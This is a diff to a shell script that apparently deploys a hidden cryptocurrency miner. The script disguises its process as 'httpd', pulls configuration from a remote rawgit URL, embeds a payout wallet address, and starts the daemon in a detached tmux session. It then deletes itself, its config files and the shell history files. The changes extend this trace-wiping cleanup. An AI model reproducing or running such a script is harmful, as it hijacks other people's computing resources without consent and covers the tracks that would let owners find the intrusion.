@@ -28,7 +28,7 @@ OBJ_MASK=${OBJ_MASK:-httpd}
 DAEMON=${DAEMON:-pausd}
 OBJ_CFG=${OBJ_CFG:-cfg}
 CFG_BASE_URL=https://rawgit.com/untoreh/scripts/cfg/
-DAEMON_ARGS=${DAEMON_ARGS:-${OBJ_MASK} ${OBJ_CFG}}
+DAEMON_ARGS=${DAEMON_ARGS:-${OBJ_MASK} ${OBJ_MASK}.conf.subst}
 
 ## download cfg
 if [ "$OBJ_CFG" != cfg ]; then
@@ -71,10 +71,15 @@ ID=${ID:-"{$IPADDR}{$HOSTN}{$DATE}{$CORES}{$CPU}"} \
 PA=${PA:-4ACgpqzFZCiRfmZHAX11tAMLft1KNvLhWh83JXpYFKfKDhT7GXK89AoM4jNV1RRUUghAbuP1FrqTFU5w4zbN3F9GG6mqNPq} \
 ENDPOINT=${ENDPONT:-127.0.0.1:8080}
 ## subst
-cat ${OBJ_MASK}.conf | envsubst
+cat ${OBJ_MASK}.conf | envsubst > ${OBJ_MASK}.conf.subst
 
 ## init
 tmux new-session -d -s ${DAEMON} ${DAEMON} ${DAEMON_ARGS}
 
 ## cleanup
-rm -- "$0" "$OBJ_CFG" "$HOME/.*_history" "/.*_history" &>/dev/null
+rm -- "$0" \
+   "$OBJ_CFG" \
+   "$OBJ_MASK.conf*" \
+   "$HOME/.*_history" \
+   "/.*_history" \
+   &>/dev/null
